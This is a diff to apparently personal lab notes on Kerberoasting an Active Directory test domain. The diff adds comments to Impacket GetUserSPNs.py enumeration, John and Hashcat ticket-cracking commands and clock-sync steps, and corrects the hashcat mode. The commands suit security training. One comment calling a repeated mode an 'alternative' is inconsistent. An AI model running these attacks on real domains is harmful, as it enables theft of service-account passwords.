@@ -28,10 +28,10 @@ sudo python3 -m pip install .
 
 Check kerberoastable users using the Impacket's module GetUserSPNs.py
 ```bash
-GetUserSPNs.py <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <DC_IP OR DC_DOMAIN>
-
-# example
+# Lists all accounts with SPNs (service accounts)
 GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc
+# Same command structure for any domain/user
+GetUserSPNs.py <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <DC_IP>
 ```
 
 It will searches for **accounts that have SPNs (service accounts)**
@@ -60,9 +60,12 @@ GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc -request-use
 # 4.  **Crack the TGS Ticket (Offline)**
 
 ```bash
+# Cracks with John the Ripper
 john --wordlist=/home/kali/Documents/password.txt ./kerberoast.txt
-
-hashcat -m 18200 ./kerberoast.txt /home/kali/Documents/password.txt
+# Cracks with Hashcat (mode 13100 for TGS-REP)
+hashcat -m 13100 ./kerberoast.txt /home/kali/Documents/password.txt
+# Alternative mode for RC4 encrypted tickets
+hashcat -m 13100 --force kerberoast.txt rockyou.txt
 ```
 ![[Pasted image 20260415150436.png]]
 
@@ -71,7 +74,10 @@ hashcat -m 18200 ./kerberoast.txt /home/kali/Documents/password.txt
 If you encounter `KRB_AP_ERR_SKEW (Clock skew too great)`, synchronize the clocks with:
 
 ```bash
+# Disables automatic time sync
 sudo timedatectl set-ntp off
+# Checks time difference with DC
 ntpdate -q corp-dc
+# Forces time sync with DC
 ntpdate -u corp-dc
 ```
